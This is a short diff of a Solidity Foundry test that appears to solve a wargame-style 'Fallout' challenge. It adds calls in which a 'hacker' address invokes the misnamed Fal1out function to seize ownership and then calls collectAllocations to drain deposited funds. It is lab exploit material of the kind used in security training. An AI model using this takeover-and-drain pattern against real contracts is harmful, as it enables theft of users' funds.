@@ -17,11 +17,16 @@ function testFallouty() public{
         address player = address(uint160(i));
         vm.deal(player , 10 ether);
         vm.prank(player);
-        allocate{value:5 ether}();
+        falyout.allocate{value:5 ether}();
     }
     address hacker = makeAddr("Saad");
     vm.deal(hacker,10 ether);
     vm.prank(hacker);
+ falyout.Fal1out{value:5 ether}();
+
+falyout. collectAllocations();
+
+
 }
 
 }
